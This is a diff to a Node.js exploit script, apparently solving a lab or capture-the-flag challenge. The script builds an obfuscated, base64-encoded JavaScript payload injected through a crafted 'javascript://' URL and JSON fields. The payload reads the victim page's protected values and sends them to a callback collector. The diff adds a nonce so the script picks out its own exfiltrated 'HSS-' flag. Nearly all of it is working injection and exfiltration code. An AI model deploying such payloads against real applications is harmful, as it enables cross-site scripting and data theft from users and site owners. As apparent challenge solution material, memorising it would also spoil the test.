@@ -7,6 +7,7 @@ const http = require('node:http');
 const https = require('node:https');
 
 const callbackBase = process.env.HSS_WEBHOOK_URL || 'http://127.0.0.1:1337/collect';
+const collectionNonce = [...Array(24)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
 
 function form(fields) {
   return new URLSearchParams(fields).toString();
@@ -58,7 +59,7 @@ async function waitForService() {
 async function main() {
   await waitForService();
 
-  const js = `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(m.channel+':'+t))`;
+  const js = `Promise.all([fetch('/review/meta').then(r=>r.json()),fetch('/review/value').then(r=>r.text())]).then(([m,t])=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(m.channel+':'+${JSON.stringify(collectionNonce)}+':'+t))`;
   const encoded = Buffer.from(js).toString('base64');
   const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
 
@@ -72,7 +73,10 @@ async function main() {
     if (callbackBase.startsWith('http://127.0.0.1:1337/collect')) {
       const res = await request('GET', '/collect');
       const items = JSON.parse(res.body).items || [];
-      const found = items.map((item) => item.value).find((value) => typeof value === 'string' && value.startsWith('HSS-'));
+      const found = items
+        .filter((item) => item.nonce === collectionNonce)
+        .map((item) => item.value)
+        .find((value) => typeof value === 'string' && value.startsWith('HSS-'));
       if (found) {
         fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
         return;
@@ -92,7 +96,8 @@ async function main() {
       const rawUrl = item.url || '';
       const encodedValue = rawUrl.includes('?') ? rawUrl.split('?').pop() : '';
       const decoded = Buffer.from(encodedValue, 'base64').toString('utf8');
-      const found = decoded.includes(':') ? decoded.split(':').slice(1).join(':') : decoded;
+      const [tag, nonce, ...rest] = decoded.split(':');
+      const found = nonce === collectionNonce ? rest.join(':') : '';
       if (found.startsWith('HSS-')) {
         fs.writeFileSync('/app/output/recovered_value.txt', `${found}\n`, { mode: 0o600 });
       return;
